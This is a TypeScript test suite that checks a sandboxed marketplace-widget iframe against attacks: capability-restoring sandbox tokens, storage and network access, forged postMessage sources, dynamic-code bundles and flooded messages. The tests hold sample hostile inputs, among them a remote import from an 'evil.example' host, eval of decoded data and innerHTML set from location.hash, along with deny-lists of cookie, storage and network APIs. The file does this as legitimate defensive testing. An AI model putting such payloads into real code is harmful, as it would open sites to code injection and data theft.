/**
 * WidgetSandbox ATTACK suite — hostile-island containment, verified under node.
 *
 * Threat model: the marketplace bundle is attacker-controlled. It runs in a
 * null-origin srcdoc document (`sandbox` without `allow-same-origin`) and
 * reaches the host ONLY through versioned v1 postMessage envelopes. Every
 * attack below must end in: rejection without host damage, no throw, no
 * navigation, no exfiltration channel, no cross-install data.
 *
 * Browser-truthful limits: these tests pin the host-side contract (sandbox
 * tokens, frame CSP string, bridge verdicts, source invariants). They cannot
 * execute a real null-origin frame under node — DOM-escape assertions are
 * static source invariants plus bridge behavior, stated as such.
 */
import { describe, expect, it, vi } from "vitest";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import { FRAME_HTML, handleSandboxMessage } from "./WidgetSandbox";
import { createFloodGuard } from "@/lib/bridge-flood-guard";
import {
  createThemeGuard,
  handleThemeMessage,
} from "@/components/theme-runtime/bridge-v2";
import { resolvePolicy, RISK_TIERS } from "@/lib/risk-tier";
import {
  BUNDLE_ENTRY_DYNAMIC_CODE_RE,
  validateBundle,
} from "@/lib/marketplace-scopes";

const DIR = dirname(fileURLToPath(import.meta.url));
const src = (f: string) => readFileSync(join(DIR, f), "utf8");

describe("attack: sandbox tokens never restore a capability", () => {
  it("no tier grants same-origin, top-navigation, or popup escape", () => {
    for (const tier of RISK_TIERS) {
      const policy = resolvePolicy(tier);
      expect(policy.iframe.allowSameOrigin, tier).toBe(false);
      expect(policy.iframe.sandbox, tier).not.toMatch(/allow-same-origin/);
      expect(policy.iframe.sandbox, tier).not.toMatch(/allow-top-navigation/);
      expect(policy.iframe.sandbox, tier).not.toMatch(
        /allow-popups-to-escape-sandbox/,
      );
      expect(policy.iframe.referrerPolicy, tier).toBe("no-referrer");
    }
  });

  it("the component renders exactly the resolved policy tokens (no widening)", () => {
    const tsx = src("WidgetSandbox.tsx");
    expect(tsx).toContain("sandbox={policy.iframe.sandbox}");
    // Exactly one sandbox binding — the resolved policy. A second binding
    // (hardcoded widening, conditional tokens) would show up here.
    expect(tsx.match(/sandbox=\{/g)?.length).toBe(1);
    // No quoted capability-restoring token anywhere in code (prose excluded
    // by the quote pattern — comments use backticks, not quotes).
    expect(tsx).not.toMatch(/["']allow-same-origin["']/);
    expect(tsx).not.toMatch(/["']allow-top-navigation/);
    expect(tsx).not.toMatch(/["']allow-popups-to-escape-sandbox["']/);
  });
});

describe("attack: storage / cookie access unreachable", () => {
  it("frame bootstrap touches no storage, cookie, or credential surface", () => {
    const html = FRAME_HTML(
      "framique.mount(document.createElement('div'))",
      "https://shop.example.com",
      "n",
    );
    for (const api of [
      "document.cookie",
      "localStorage",
      "sessionStorage",
      "indexedDB",
      "navigator.credentials",
      "requestStorageAccess",
    ]) {
      expect(html, api).not.toContain(api);
    }
  });
});

describe("attack: credentialed fetch / exfiltration network denied", () => {
  it("frame CSP denies the island its own network and framing", () => {
    const html = FRAME_HTML(
      "framique.mount(document.createElement('div'))",
      "https://shop.example.com",
      "n",
    );
    expect(html).toContain("default-src 'none'");
    expect(html).toContain("connect-src 'none'");
    expect(html).toContain("img-src 'none'");
  });

  it("frame bootstrap uses no network or comms primitives", () => {
    const html = FRAME_HTML(
      "framique.mount(document.createElement('div'))",
      "https://shop.example.com",
      "n",
    );
    for (const api of [
      "fetch(",
      "XMLHttpRequest",
      "WebSocket",
      "EventSource",
      "sendBeacon",
      "Worker(",
      "importScripts",
      "FormData",
    ]) {
      expect(html, api).not.toContain(api);
    }
  });

  it("replies address the verified frame window, requests the page origin", () => {
    const tsx = src("WidgetSandbox.tsx");
    // Replies go to event.source (verified owned window) — never broadcast.
    expect(tsx).toContain("event.source !== frame.contentWindow");
    expect(tsx).toContain("frame.contentWindow?.postMessage");
    // The island addresses the parent by the explicit page origin.
    const html = FRAME_HTML(
      "framique.mount(document.createElement('div'))",
      "https://shop.example.com",
      "n",
    );
    expect(html).toContain(
      'parent.postMessage({ v: 1, id, method, params }, "https://shop.example.com")',
    );
    expect(html).not.toContain('postMessage({ v: 1, id, method, params }, "*"');
  });
});

describe("attack: postMessage spoofing (forged source) refused", () => {
  it("pins the owned-window check in the listener", () => {
    const tsx = src("WidgetSandbox.tsx");
    expect(tsx).toContain(
      "if (!frame || event.source !== frame.contentWindow) return;",
    );
  });

  it("spoofed traffic is refused before scope checks and host contact", async () => {
    const onCall = vi.fn(async () => ({ ok: true }));
    const guard = createFloodGuard();
    const out = await handleSandboxMessage(
      { v: 1, id: "spoof", method: "shop.info" },
      {
        granted: ["read_shop", "render_storefront"],
        onCall,
        guard,
        now: 0,
        sourceValid: false,
      },
    );
    expect(out).toEqual({ error: "sandbox.forged_source" });
    expect(onCall).not.toHaveBeenCalled();
    expect(guard.times.length).toBe(0);
  });
});

describe("attack: worker / blob / dynamic-code imports contained", () => {
  it("bundle gate rejects dynamic-code entries before anything mounts", () => {
    for (const entry of [
      "import('https://evil.example/x.js')",
      "eval(atob('e30='))",
      "new Function('return 1')",
      'setTimeout("alert(1)", 0)',
      "el.innerHTML = location.hash",
      "document.write('<script>')",
    ]) {
      expect(BUNDLE_ENTRY_DYNAMIC_CODE_RE.test(entry), entry).toBe(true);
      expect(
        validateBundle({ entry }, ["render_storefront"]).errors,
        entry,
      ).toContain("bundle.dynamic_code");
    }
  });

  it("frame CSP leaves workers/blobs no execution path (default-src none)", () => {
    // worker-src falls back to script-src, which falls back to default-src:
    // 'none' plus a pinned script-src means no blob:/data: worker, no
    // remote import, no form exfiltration — even for a compromised entry.
    const html = FRAME_HTML(
      "framique.mount(document.createElement('div'))",
      "https://shop.example.com",
      "n",
    );
    expect(html).toContain("default-src 'none'");
    expect(html).not.toMatch(/blob:/);
    expect(html).not.toMatch(/data:/);
  });
});

describe("attack: oversized / flooded bridge traffic stays bounded", () => {
  it("lanes are independent: a widget storm never spends theme budget", async () => {
    const widgetGuard = createFloodGuard();
    const themeGuard = createThemeGuard();
    const wCall = vi.fn(async () => ({ ok: true }));
    const tCall = vi.fn(async () => ({ ok: true }));
    for (let i = 0; i < 40; i++) {
      await handleSandboxMessage(
        { v: 1, id: `w-${i}`, method: "shop.info" },
        {
          granted: ["read_shop", "render_storefront"],
          onCall: wCall,
          guard: widgetGuard,
          now: 0,
        },
      );
    }
    // Widget lane saturated (30 admitted, 10 rate-limited)…
    expect(wCall).toHaveBeenCalledTimes(30);
    // …theme lane on its own guard is unaffected.
    await expect(
      handleThemeMessage(
        { v: 2, id: "t-0", method: "storefront.read" },
        {
          granted: ["theme:storefront:read"],
          onCall: tCall,
          guard: themeGuard,
          now: 0,
        },
      ),
    ).resolves.toEqual({ result: { ok: true } });
    expect(tCall).toHaveBeenCalledTimes(1);
  });

  it("single 64 KiB+ envelope refused without host contact", async () => {
    const onCall = vi.fn(async () => ({ ok: true }));
    const out = await handleSandboxMessage(
      {
        v: 1,
        id: "big",
        method: "shop.info",
        params: { blob: "x".repeat(70 * 1024) },
      },
      {
        granted: ["read_shop", "render_storefront"],
        onCall,
        guard: createFloodGuard(),
        now: 0,
      },
    );
    expect(out).toEqual({ error: "sandbox.oversize" });
    expect(onCall).not.toHaveBeenCalled();
  });
});

describe("attack: no persistent host resources per mount (leak hygiene)", () => {
  it("frame bootstrap creates no timers, observers, media, or GL contexts", () => {
    const html = FRAME_HTML(
      "framique.mount(document.createElement('div'))",
      "https://shop.example.com",
      "n",
    );
    for (const api of [
      "setTimeout",
      "setInterval",
      "requestAnimationFrame",
      "IntersectionObserver",
      "MutationObserver",
      "ResizeObserver",
      "PerformanceObserver",
      "AudioContext",
      "MediaSource",
      "getContext",
      "WebGL",
      "createObjectURL",
    ]) {
      expect(html, api).not.toContain(api);
    }
    // One listener, one pending map: the only per-mount host-visible state
    // is message replies, which drop `pending` on first answer.
    expect(html).toContain("pending.delete(d.id)");
  });

  it("host listener is removed on unmount and guard resets on identity change", () => {
    const tsx = src("WidgetSandbox.tsx");
    expect(tsx).toContain(
      'return () => window.removeEventListener("message", onMessage);',
    );
    expect(tsx).toContain("resetFloodGuard(floodRef.current)");
  });
});
